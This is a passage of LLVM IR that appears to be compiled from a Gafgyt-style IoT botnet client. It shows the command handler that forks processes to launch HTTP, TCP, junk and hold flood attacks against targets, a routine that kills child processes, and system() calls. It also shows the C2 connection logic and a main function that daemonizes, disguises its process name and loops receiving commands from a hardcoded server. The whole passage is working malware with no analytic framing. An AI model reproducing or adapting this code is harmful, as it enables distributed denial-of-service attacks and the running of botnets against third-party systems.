.loopexit224:                                     ; preds = %.loopexit224.loopexit, %.loopexit226
  %203 = load i8*, i8** %1, align 8
  %204 = tail call i32 @strcmp(i8* %203, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.80, i64 0, i64 0)) #15
  %205 = icmp eq i32 %204, 0
  br i1 %205, label %206, label %.loopexit222

; <label>:206:                                    ; preds = %.loopexit224
  %207 = icmp slt i32 %0, 3
  br i1 %207, label %397, label %208

; <label>:208:                                    ; preds = %206
  %209 = getelementptr inbounds i8*, i8** %1, i64 2
  %210 = load i8*, i8** %209, align 8
  %211 = tail call i32 @atoi(i8* %210) #15
  %212 = icmp slt i32 %211, 1
  br i1 %212, label %397, label %213

; <label>:213:                                    ; preds = %208
  %214 = getelementptr inbounds i8*, i8** %1, i64 1
  %215 = load i8*, i8** %214, align 8
  %strchr200 = tail call i8* @strchr(i8* %215, i32 44)
  %216 = icmp eq i8* %strchr200, null
  br i1 %216, label %224, label %.preheader221.preheader

.preheader221.preheader:                          ; preds = %213
  br label %.preheader221

.preheader221:                                    ; preds = %.preheader221.preheader, %219
  %.sink208 = phi i8* [ null, %219 ], [ %215, %.preheader221.preheader ]
  %217 = tail call i8* @strtok(i8* %.sink208, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #3
  %218 = icmp eq i8* %217, null
  br i1 %218, label %.loopexit222.loopexit, label %219

; <label>:219:                                    ; preds = %.preheader221
  %220 = tail call i32 @listFork()
  %221 = icmp eq i32 %220, 0
  br i1 %221, label %.preheader220, label %.preheader221

.preheader220:                                    ; preds = %219
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  %222 = load i32, i32* @mainCommSock, align 4
  %223 = tail call i32 @close(i32 %222) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:224:                                    ; preds = %213
  %225 = tail call i32 @listFork()
  %226 = icmp eq i32 %225, 0
  br i1 %226, label %.preheader, label %397

.preheader:                                       ; preds = %224
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  tail call void @sendHTTP(i8* %215, i32 %211)
  %227 = load i32, i32* @mainCommSock, align 4
  %228 = tail call i32 @close(i32 %227) #3
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit222.loopexit:                            ; preds = %.preheader221
  br label %.loopexit222

.loopexit222:                                     ; preds = %.loopexit222.loopexit, %.loopexit224
  %229 = load i8*, i8** %1, align 8
  %230 = tail call i32 @strcmp(i8* %229, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.81, i64 0, i64 0)) #15
  %231 = icmp eq i32 %230, 0
  br i1 %231, label %232, label %.loopexit219

; <label>:232:                                    ; preds = %.loopexit222
  %233 = icmp slt i32 %0, 4
  br i1 %233, label %397, label %234

; <label>:234:                                    ; preds = %232
  %235 = getelementptr inbounds i8*, i8** %1, i64 2
  %236 = load i8*, i8** %235, align 8
  %237 = tail call i32 @atoi(i8* %236) #15
  %238 = icmp slt i32 %237, 1
  br i1 %238, label %397, label %239

; <label>:239:                                    ; preds = %234
  %240 = getelementptr inbounds i8*, i8** %1, i64 3
  %241 = load i8*, i8** %240, align 8
  %242 = tail call i32 @atoi(i8* %241) #15
  %243 = icmp slt i32 %242, 1
  br i1 %243, label %397, label %244

; <label>:244:                                    ; preds = %239
  %245 = getelementptr inbounds i8*, i8** %1, i64 1
  %246 = load i8*, i8** %245, align 8
  %strchr201 = tail call i8* @strchr(i8* %246, i32 44)
  %247 = icmp eq i8* %strchr201, null
  br i1 %247, label %256, label %.preheader218.preheader

.preheader218.preheader:                          ; preds = %244
  br label %.preheader218

.preheader218:                                    ; preds = %.preheader218.preheader, %250
  %.sink209 = phi i8* [ null, %250 ], [ %246, %.preheader218.preheader ]
  %248 = tail call i8* @strtok(i8* %.sink209, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #3
  %249 = icmp eq i8* %248, null
  br i1 %249, label %.loopexit219.loopexit, label %250

; <label>:250:                                    ; preds = %.preheader218
  %251 = tail call i32 @listFork()
  %252 = icmp eq i32 %251, 0
  br i1 %252, label %253, label %.preheader218

; <label>:253:                                    ; preds = %250
  tail call void @sendCNC(i8* nonnull %248, i32 %237, i32 %242)
  %254 = load i32, i32* @mainCommSock, align 4
  %255 = tail call i32 @close(i32 %254) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:256:                                    ; preds = %244
  %257 = tail call i32 @listFork()
  %258 = icmp eq i32 %257, 0
  br i1 %258, label %259, label %397

; <label>:259:                                    ; preds = %256
  tail call void @sendCNC(i8* %246, i32 %237, i32 %242)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit219.loopexit:                            ; preds = %.preheader218
  br label %.loopexit219

.loopexit219:                                     ; preds = %.loopexit219.loopexit, %.loopexit222
  %260 = load i8*, i8** %1, align 8
  %261 = tail call i32 @strcmp(i8* %260, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i64 0, i64 0)) #15
  %262 = icmp eq i32 %261, 0
  br i1 %262, label %263, label %.loopexit217

; <label>:263:                                    ; preds = %.loopexit219
  %264 = icmp slt i32 %0, 4
  br i1 %264, label %397, label %265

; <label>:265:                                    ; preds = %263
  %266 = getelementptr inbounds i8*, i8** %1, i64 2
  %267 = load i8*, i8** %266, align 8
  %268 = tail call i32 @atoi(i8* %267) #15
  %269 = icmp slt i32 %268, 1
  br i1 %269, label %397, label %270

; <label>:270:                                    ; preds = %265
  %271 = getelementptr inbounds i8*, i8** %1, i64 3
  %272 = load i8*, i8** %271, align 8
  %273 = tail call i32 @atoi(i8* %272) #15
  %274 = icmp slt i32 %273, 1
  br i1 %274, label %397, label %275

; <label>:275:                                    ; preds = %270
  %276 = getelementptr inbounds i8*, i8** %1, i64 1
  %277 = load i8*, i8** %276, align 8
  %strchr202 = tail call i8* @strchr(i8* %277, i32 44)
  %278 = icmp eq i8* %strchr202, null
  br i1 %278, label %287, label %.preheader216.preheader

.preheader216.preheader:                          ; preds = %275
  br label %.preheader216

.preheader216:                                    ; preds = %.preheader216.preheader, %281
  %.sink210 = phi i8* [ null, %281 ], [ %277, %.preheader216.preheader ]
  %279 = tail call i8* @strtok(i8* %.sink210, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #3
  %280 = icmp eq i8* %279, null
  br i1 %280, label %.loopexit217.loopexit, label %281

; <label>:281:                                    ; preds = %.preheader216
  %282 = tail call i32 @listFork()
  %283 = icmp eq i32 %282, 0
  br i1 %283, label %284, label %.preheader216

; <label>:284:                                    ; preds = %281
  tail call void @sendJUNK(i8* nonnull %279, i32 %268, i32 %273)
  tail call void @sendHOLD(i8* nonnull %279, i32 %268, i32 %273)
  %285 = load i32, i32* @mainCommSock, align 4
  %286 = tail call i32 @close(i32 %285) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:287:                                    ; preds = %275
  %288 = tail call i32 @listFork()
  %289 = icmp eq i32 %288, 0
  br i1 %289, label %290, label %397

; <label>:290:                                    ; preds = %287
  tail call void @sendJUNK(i8* %277, i32 %268, i32 %273)
  tail call void @sendHOLD(i8* %277, i32 %268, i32 %273)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit217.loopexit:                            ; preds = %.preheader216
  br label %.loopexit217

.loopexit217:                                     ; preds = %.loopexit217.loopexit, %.loopexit219
  %291 = load i8*, i8** %1, align 8
  %292 = tail call i32 @strcmp(i8* %291, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i64 0, i64 0)) #15
  %293 = icmp eq i32 %292, 0
  br i1 %293, label %294, label %.loopexit215

; <label>:294:                                    ; preds = %.loopexit217
  %295 = icmp slt i32 %0, 6
  br i1 %295, label %397, label %296

; <label>:296:                                    ; preds = %294
  %297 = getelementptr inbounds i8*, i8** %1, i64 3
  %298 = load i8*, i8** %297, align 8
  %299 = tail call i32 @atoi(i8* %298) #15
  %300 = icmp eq i32 %299, -1
  br i1 %300, label %397, label %301

; <label>:301:                                    ; preds = %296
  %302 = getelementptr inbounds i8*, i8** %1, i64 2
  %303 = load i8*, i8** %302, align 8
  %304 = tail call i32 @atoi(i8* %303) #15
  %305 = icmp eq i32 %304, -1
  br i1 %305, label %397, label %306

; <label>:306:                                    ; preds = %301
  %307 = getelementptr inbounds i8*, i8** %1, i64 4
  %308 = load i8*, i8** %307, align 8
  %309 = tail call i32 @atoi(i8* %308) #15
  %310 = icmp eq i32 %309, -1
  %311 = icmp sgt i32 %309, 32
  %or.cond211 = or i1 %310, %311
  br i1 %or.cond211, label %397, label %312

; <label>:312:                                    ; preds = %306
  %313 = icmp sgt i32 %0, 6
  br i1 %313, label %314, label %.thread

; <label>:314:                                    ; preds = %312
  %315 = getelementptr inbounds i8*, i8** %1, i64 6
  %316 = load i8*, i8** %315, align 8
  %317 = tail call i32 @atoi(i8* %316) #15
  %318 = icmp slt i32 %317, 0
  br i1 %318, label %397, label %319

; <label>:319:                                    ; preds = %314
  %320 = icmp eq i32 %0, 8
  br i1 %320, label %321, label %.thread

; <label>:321:                                    ; preds = %319
  %322 = getelementptr inbounds i8*, i8** %1, i64 7
  %323 = load i8*, i8** %322, align 8
  %324 = tail call i32 @atoi(i8* %323) #15
  %325 = icmp slt i32 %324, 1
  br i1 %325, label %397, label %.thread

.thread:                                          ; preds = %312, %321, %319
  %326 = phi i1 [ true, %321 ], [ false, %319 ], [ false, %312 ]
  %327 = getelementptr inbounds i8*, i8** %1, i64 1
  %328 = load i8*, i8** %327, align 8
  %329 = load i8*, i8** %302, align 8
  %330 = tail call i32 @atoi(i8* %329) #15
  %331 = load i8*, i8** %297, align 8
  %332 = tail call i32 @atoi(i8* %331) #15
  %333 = load i8*, i8** %307, align 8
  %334 = tail call i32 @atoi(i8* %333) #15
  %335 = getelementptr inbounds i8*, i8** %1, i64 5
  %336 = load i8*, i8** %335, align 8
  br i1 %326, label %337, label %341

; <label>:337:                                    ; preds = %.thread
  %338 = getelementptr inbounds i8*, i8** %1, i64 7
  %339 = load i8*, i8** %338, align 8
  %340 = tail call i32 @atoi(i8* %339) #15
  br label %341

; <label>:341:                                    ; preds = %.thread, %337
  %342 = phi i32 [ %340, %337 ], [ 10, %.thread ]
  br i1 %313, label %343, label %347

; <label>:343:                                    ; preds = %341
  %344 = getelementptr inbounds i8*, i8** %1, i64 6
  %345 = load i8*, i8** %344, align 8
  %346 = tail call i32 @atoi(i8* %345) #15
  br label %347

; <label>:347:                                    ; preds = %341, %343
  %348 = phi i32 [ %346, %343 ], [ 0, %341 ]
  %strchr203 = tail call i8* @strchr(i8* %328, i32 44)
  %349 = icmp eq i8* %strchr203, null
  br i1 %349, label %356, label %.preheader214.preheader

.preheader214.preheader:                          ; preds = %347
  br label %.preheader214

.preheader214:                                    ; preds = %.preheader214.preheader, %352
  %.sink212 = phi i8* [ null, %352 ], [ %328, %.preheader214.preheader ]
  %350 = tail call i8* @strtok(i8* %.sink212, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #3
  %351 = icmp eq i8* %350, null
  br i1 %351, label %.loopexit215.loopexit, label %352

; <label>:352:                                    ; preds = %.preheader214
  %353 = tail call i32 @listFork()
  %354 = icmp eq i32 %353, 0
  br i1 %354, label %355, label %.preheader214

; <label>:355:                                    ; preds = %352
  tail call void @sendTCP(i8* nonnull %350, i32 %330, i32 %332, i32 %334, i8* %336, i32 %348, i32 %342)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:356:                                    ; preds = %347
  %357 = tail call i32 @listFork()
  %358 = icmp eq i32 %357, 0
  br i1 %358, label %359, label %397

; <label>:359:                                    ; preds = %356
  tail call void @sendTCP(i8* %328, i32 %330, i32 %332, i32 %334, i8* %336, i32 %348, i32 %342)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit215.loopexit:                            ; preds = %.preheader214
  br label %.loopexit215

.loopexit215:                                     ; preds = %.loopexit215.loopexit, %.loopexit217
  %360 = load i8*, i8** %1, align 8
  %361 = tail call i32 @strcmp(i8* %360, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.84, i64 0, i64 0)) #15
  %362 = icmp eq i32 %361, 0
  %363 = load i64, i64* @numpids, align 8
  %364 = icmp ne i64 %363, 0
  %or.cond243 = and i1 %362, %364
  br i1 %or.cond243, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit215
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %377
  %.0240 = phi i64 [ %378, %377 ], [ 0, %.lr.ph.preheader ]
  %365 = load i32*, i32** @pids, align 8
  %366 = getelementptr inbounds i32, i32* %365, i64 %.0240
  %367 = load i32, i32* %366, align 4
  %368 = icmp eq i32 %367, 0
  br i1 %368, label %377, label %369

; <label>:369:                                    ; preds = %.lr.ph
  %370 = tail call i32 @getpid() #3
  %371 = icmp eq i32 %367, %370
  br i1 %371, label %377, label %372

; <label>:372:                                    ; preds = %369
  %373 = load i32*, i32** @pids, align 8
  %374 = getelementptr inbounds i32, i32* %373, i64 %.0240
  %375 = load i32, i32* %374, align 4
  %376 = tail call i32 @kill(i32 %375, i32 9) #3
  br label %377

; <label>:377:                                    ; preds = %369, %.lr.ph, %372
  %378 = add i64 %.0240, 1
  %379 = load i64, i64* @numpids, align 8
  %380 = icmp ult i64 %378, %379
  br i1 %380, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %377
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit215
  %381 = load i8*, i8** %1, align 8
  %382 = tail call i32 @strcmp(i8* %381, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.85, i64 0, i64 0)) #15
  %383 = icmp eq i32 %382, 0
  br i1 %383, label %384, label %385

; <label>:384:                                    ; preds = %.loopexit
  tail call void @exit(i32 0) #17
  unreachable

; <label>:385:                                    ; preds = %.loopexit
  %386 = tail call i32 @strcmp(i8* %381, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i64 0, i64 0)) #15
  %387 = icmp eq i32 %386, 0
  br i1 %387, label %388, label %397

; <label>:388:                                    ; preds = %385
  %389 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.87, i64 0, i64 0)) #3
  %390 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.88, i64 0, i64 0)) #3
  %391 = tail call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.89, i64 0, i64 0)) #3
  %392 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.90, i64 0, i64 0)) #3
  %393 = tail call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.91, i64 0, i64 0)) #3
  %394 = tail call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.92, i64 0, i64 0)) #3
  %395 = tail call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.93, i64 0, i64 0)) #3
  %396 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.94, i64 0, i64 0)) #3
  br label %397

; <label>:397:                                    ; preds = %385, %356, %287, %256, %224, %199, %170, %108, %77, %41, %294, %296, %301, %306, %314, %321, %263, %265, %270, %232, %234, %239, %206, %208, %177, %179, %184, %115, %117, %122, %127, %132, %141, %84, %86, %91, %55, %57, %62, %30, %388, %47, %22, %12, %6
  ret void
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #15
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #15
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 443, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #18
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.96, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i64 0, i64 0)) #15
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #14 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.98, i64 0, i64 0)
}

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture readonly) local_unnamed_addr #12 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [10 x i8*], align 16
  %7 = tail call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.100, i64 0, i64 0), i32 0) #3
  %8 = icmp eq i32 %7, -1
  %. = select i1 %8, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.102, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.101, i64 0, i64 0)
  %9 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.103, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.98, i64 0, i64 0))
  %10 = load i8*, i8** %1, align 8
  %11 = tail call i64 @strlen(i8* %10) #15
  tail call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 %11, i32 1, i1 false)
  %12 = load i8*, i8** %1, align 8
  %13 = tail call i32 (i8*, i8*, ...) @sprintf(i8* %12, i8* %.) #3
  %14 = ptrtoint i8* %. to i64
  %15 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %14, i32 0, i32 0, i32 0) #3
  %16 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %17 = tail call i32 @getpid() #3
  %18 = xor i32 %17, %16
  tail call void @srand(i32 %18) #3
  %19 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %20 = tail call i32 @getpid() #3
  %21 = xor i32 %20, %19
  tail call void @init_rand(i32 %21)
  %22 = tail call i32 @getOurIP()
  %23 = tail call i32 @fork() #3
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %27, label %25

; <label>:25:                                     ; preds = %2
  %26 = call i32 @waitpid(i32 %23, i32* nonnull %3, i32 0) #3
  call void @exit(i32 0) #17
  unreachable

; <label>:27:                                     ; preds = %2
  %28 = tail call i32 @fork() #3
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %31, label %30

; <label>:30:                                     ; preds = %27
  tail call void @exit(i32 0) #17
  unreachable

; <label>:31:                                     ; preds = %27
  %32 = tail call i32 @setsid() #3
  %33 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.104, i64 0, i64 0)) #3
  %34 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %35 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %36 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 1
  %37 = getelementptr inbounds [10 x i8*], [10 x i8*]* %6, i64 0, i64 0
  br label %.backedge86

.backedge86.loopexit:                             ; preds = %.backedge
  br label %.backedge86.backedge

.backedge86:                                      ; preds = %.backedge86.backedge, %31
  %38 = call i32 @initConnection()
  %39 = icmp eq i32 %38, 0
  br i1 %39, label %42, label %40

; <label>:40:                                     ; preds = %.backedge86
  %41 = call i32 @sleep(i32 5) #3
  br label %.backedge86.backedge

; <label>:42:                                     ; preds = %.backedge86
  %43 = load i32, i32* @mainCommSock, align 4
  %44 = call i32 (i32, i8*, ...) @sockprintf(i32 %43, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.105, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.98, i64 0, i64 0))
  %45 = load i32, i32* @mainCommSock, align 4
  %46 = call i32 @recvLine(i32 %45, i8* nonnull %35, i32 4096)
  %47 = icmp eq i32 %46, -1
  br i1 %47, label %.backedge86.backedge, label %.preheader84.preheader

.backedge86.backedge:                             ; preds = %42, %40, %.backedge86.loopexit
  br label %.backedge86

.preheader84.preheader:                           ; preds = %42
  br label %.preheader84

.preheader84:                                     ; preds = %.preheader84.preheader, %.backedge
  %48 = phi i32 [ %103, %.backedge ], [ %46, %.preheader84.preheader ]
  %49 = load i64, i64* @numpids, align 8
  %50 = icmp eq i64 %49, 0
  br i1 %50, label %._crit_edge103, label %.lr.ph102.preheader

.lr.ph102.preheader:                              ; preds = %.preheader84
  br label %.lr.ph102

.lr.ph102:                                        ; preds = %.lr.ph102.preheader, %93
  %indvars.iv = phi i64 [ %indvars.iv.next, %93 ], [ 0, %.lr.ph102.preheader ]
  %51 = load i32*, i32** @pids, align 8
  %52 = getelementptr inbounds i32, i32* %51, i64 %indvars.iv
  %53 = load i32, i32* %52, align 4
  %54 = call i32 @waitpid(i32 %53, i32* null, i32 1) #3
  %55 = icmp sgt i32 %54, 0
  br i1 %55, label %.preheader, label %93

.preheader:                                       ; preds = %.lr.ph102
  %56 = add nuw i64 %indvars.iv, 1
  %57 = load i64, i64* @numpids, align 8
  %58 = icmp ult i64 %56, %57
  %59 = load i32*, i32** @pids, align 8
  %60 = trunc i64 %indvars.iv to i32
  br i1 %58, label %.lr.ph93.preheader, label %._crit_edge94

.lr.ph93.preheader:                               ; preds = %.preheader
  %61 = trunc i64 %56 to i32
  %62 = trunc i64 %indvars.iv to i32
  br label %.lr.ph93

.lr.ph93:                                         ; preds = %.lr.ph93.preheader, %.lr.ph93
  %63 = phi i32* [ %72, %.lr.ph93 ], [ %59, %.lr.ph93.preheader ]
  %64 = phi i64 [ %69, %.lr.ph93 ], [ %56, %.lr.ph93.preheader ]
  %.07192 = phi i32 [ %.071, %.lr.ph93 ], [ %61, %.lr.ph93.preheader ]
  %.071.in91 = phi i32 [ %.07192, %.lr.ph93 ], [ %62, %.lr.ph93.preheader ]
  %65 = getelementptr inbounds i32, i32* %63, i64 %64
  %66 = load i32, i32* %65, align 4
  %67 = zext i32 %.071.in91 to i64
